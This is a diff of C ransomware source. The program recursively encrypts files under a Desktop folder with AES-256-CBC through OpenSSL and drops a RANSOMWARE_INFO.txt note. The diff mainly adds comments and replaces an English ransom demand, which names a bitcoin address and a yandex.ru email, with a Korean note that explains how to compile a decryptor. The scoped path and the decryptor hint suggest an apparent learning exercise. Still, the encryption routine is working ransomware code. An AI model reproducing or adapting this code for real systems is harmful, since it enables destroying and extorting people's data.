@@ -10,7 +10,7 @@
 
 void ls_dir(char* start_path);
 void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);
-void TEXT_RANSOMWARE_INFO(char* start_path_readme);
+void TEXT_RANSOMWARE_INFO(char* start_path_readme, char* uid);
 
 int main()
 {
@@ -26,6 +26,7 @@ int main()
     lpwd = getpwuid(geteuid());
     //printf("EUNAME : %s\n", lpwd->pw_name);
     
+    //start_path
     home = "/home/";
     start_path = (char*) malloc(strlen(home)+strlen(lpwd->pw_name)+strlen("/Desktop/ransomware/")+2);
     strcpy(start_path, home);
@@ -41,8 +42,9 @@ int main()
     strcpy(start_path_readme, start_path);
     strcat(start_path_readme, "RANSOMWARE_INFO.txt");
     
-    TEXT_RANSOMWARE_INFO(start_path_readme);
-
+    //RANSOMWARE_INFO.txt
+    TEXT_RANSOMWARE_INFO(start_path_readme, lpwd->pw_name);
+    
     return 0;
 }
 
@@ -52,6 +54,7 @@ void ls_dir(char* start_path)
     unsigned char iv[] = "1234567890123456";
     DIR* dir;
     struct dirent *ent;
+    
     if((dir=opendir(start_path)) !=NULL)
     {
         while((ent=readdir(dir)) !=NULL)
@@ -60,11 +63,9 @@ void ls_dir(char* start_path)
             const char* last_four = &ent->d_name[len-4];
             if(strcmp(last_four,".enc") != 0)
             {
+                //if regular file, encrypt
                 if(ent->d_type == 8)
                 {
-                    char* full_path_readme =(char*) malloc(strlen("RANSOMWARE_INFO.txt")+strlen(start_path)+2);
-                    strcpy(full_path_readme,start_path);
-                    strcat(full_path_readme,"RANSOMWARE_INFO.txt");
                     char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);
                     strcpy(full_path,start_path);
                     strcat(full_path,ent->d_name);
@@ -76,11 +77,11 @@ void ls_dir(char* start_path)
                     {
                         FILE* fpin;
                         FILE* fpout;
-                        //FILE* fpreadme;
                         
                         fpin=fopen(full_path,"rb");
                         fpout=fopen(new_name,"wb");
                         
+                        //encrypt
                         encryptfile(fpin,fpout,key,iv);
                         
                         fclose(fpin);
@@ -91,6 +92,7 @@ void ls_dir(char* start_path)
                     free(full_path);
                     free(new_name);
                 }
+                //if directory, enter the directory
                 else if(ent->d_type==4)
                 {
                     char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
@@ -109,7 +111,7 @@ void ls_dir(char* start_path)
         }
     }
 }
-
+//encrypt
 void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
 {
     const unsigned bufsize = 4096;
@@ -120,6 +122,7 @@ void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
     
     EVP_CIPHER_CTX ctx;
     
+    //1. init
     EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);
     blocksize = EVP_CIPHER_CTX_block_size(&ctx);
     cipher_buf = malloc(bufsize+blocksize);
@@ -127,6 +130,7 @@ void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
     while(1)
     {
         int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
+        //2. update
         EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);
         fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
         if(bytes_read < bufsize)
@@ -134,7 +138,7 @@ void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
             break;
         }
     }
-    
+    //3. final
     EVP_CipherFinal(&ctx,cipher_buf,&out_len);
     fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
     
@@ -142,18 +146,25 @@ void encryptfile(FILE * fpin, FILE* fpout,unsigned char* key, unsigned char* iv)
     free(read_buf);
 }
 
-void TEXT_RANSOMWARE_INFO(char* start_path_readme){
+//RANSOMWARE_INFO.txt
+void TEXT_RANSOMWARE_INFO(char* start_path_readme, char* uid){
     FILE* fpreadme; //file RANSOMEWARE_INFO
     
     fpreadme=fopen(start_path_readme,"w");
     
-    fprintf(fpreadme, "You have been PWNED!\n\n");
-    fprintf(fpreadme, "Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n");
-    fprintf(fpreadme, "1. Tranfer money to my bitcoin address\n");
-    fprintf(fpreadme, "2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n");
-    fprintf(fpreadme, "Pay me Now!\n");
-    fprintf(fpreadme, "My Bitcoin Address:Xg7665tgf677hhjhjhhh\n");
-    fprintf(fpreadme, "Email:xxxyy@yandex.ru\n");
+    fprintf(fpreadme, "HELLO, %s.\n\n", uid);
+    fprintf(fpreadme, "지정된 경로 내의 모든 파일들이 암호화되었다.\n");
+    fprintf(fpreadme, "(Default path: /Home/%s/Desktop/ransomeware)\n", uid);
+    fprintf(fpreadme, "복호화를 원한다면 다음 순서를 진행하라. \n\n");
+    fprintf(fpreadme, "Decrypt 방법: 컴파일 후 실행\n\n");
+    fprintf(fpreadme, "1번. 컴파일\n");
+    fprintf(fpreadme, "gcc decrypt.c -lcrypto -o [파일명]\n");
+    fprintf(fpreadme, "예시) gcc decrypt.c -lcrypto -o decrypt\n");
+    fprintf(fpreadme, "decrypt.c에 해당되는 실행파일 decrypt[파일명] 가 생성됨.\n\n");
+    fprintf(fpreadme, "2번. 실행\n");
+    fprintf(fpreadme, "2-1. ./decrypt\n");
+    fprintf(fpreadme, "2-2. 생성된 decrypt 파일 double click\n\n");
+    fprintf(fpreadme, "참고) https://youtu.be/DYwdpi49lpQ\n");
     
-    fclose(fpreadme);//full_path_readme_count++;
+    fclose(fpreadme);
 }
